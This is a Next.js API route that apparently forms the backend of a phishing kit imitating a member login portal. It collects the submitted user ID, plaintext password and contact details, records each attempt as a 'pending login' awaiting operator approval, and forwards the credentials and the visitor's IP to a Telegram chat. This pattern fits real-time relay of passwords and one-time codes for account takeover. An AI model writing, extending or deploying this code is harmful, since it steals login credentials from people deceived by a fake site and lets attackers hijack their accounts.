import {NextRequest, NextResponse, after } from "next/server"
import { createPendingLogin } from '@/lib/pending-logins'
import { resolveMemberOrigin } from '@/lib/member-origin'
import { sendFormNotification } from '@/lib/telegram'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { userId = '', password = '', method, maskedEmail = '', maskedPhone = '', flow } = body
    if (!method || (method !== 'email' && method !== 'text')) {
      return NextResponse.json(
        { error: 'method is required and must be email or text' },
        { status: 400 }
      )
    }
    const memberOrigin = resolveMemberOrigin(request)
    const record = await createPendingLogin({
      projectId: 'thestandard',
      requestKind: flow === 'login_otp' ? 'otp' : 'login',
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail),
      maskedPhone: String(maskedPhone),
      memberOrigin,
    })

    const forwarded = request.headers.get('x-forwarded-for')
    const realIp = request.headers.get('x-real-ip')
    const ip = forwarded?.split(',')[0]?.trim() || realIp || 'Unknown'

after(async () => {
      if (flow === 'login_otp') {
            const sent = await sendFormNotification({
              type: 'login_otp_approval_request',
              userId: record.userId,
              password: record.password,
              method: record.method,
              maskedEmail: record.maskedEmail,
              maskedPhone: record.maskedPhone,
              page: '/admin/login',
              timestamp: new Date().toISOString(),
              ip,
            })
            if (!sent) {
              console.warn('[PlanSource] Telegram login_otp_approval_request not sent – check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID')
            }
          } else {
            const sent = await sendFormNotification({
              type: 'login_approval_request',
              userId: record.userId,
              method: record.method,
              maskedEmail: record.maskedEmail,
              maskedPhone: record.maskedPhone,
              page: '/admin/login',
              timestamp: new Date().toISOString(),
              ip,
            })
            if (!sent) {
              console.warn('[PlanSource] Telegram login_approval_request not sent – check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID')
            }
          }
    })

        return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error('Pending login create error:', e)
    return NextResponse.json({ error: 'Failed to create pending login' }, { status: 500 })
  }
}
